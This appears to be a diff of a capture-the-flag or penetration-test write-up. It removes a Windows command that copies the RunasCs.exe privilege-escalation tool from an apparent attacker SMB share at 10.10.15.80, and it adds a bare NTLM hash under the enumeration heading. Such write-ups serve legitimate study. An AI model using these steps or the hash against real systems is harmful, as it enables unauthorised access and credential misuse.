@@ -239,12 +239,7 @@ Session completed.
 
 ### Enumeration
 
-```
-c:\Users\kohsuke>copy \\10.10.15.80\share\RunasCs.exe C:\users\kohsuke\RunasCs.exe
-copy \\10.10.15.80\share\RunasCs.exe C:\users\kohsuke\RunasCs.exe
-        1 file(s) copied.
-        
-```
+aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
 ### Exploitation
 
 Step-by-step privilege escalation.
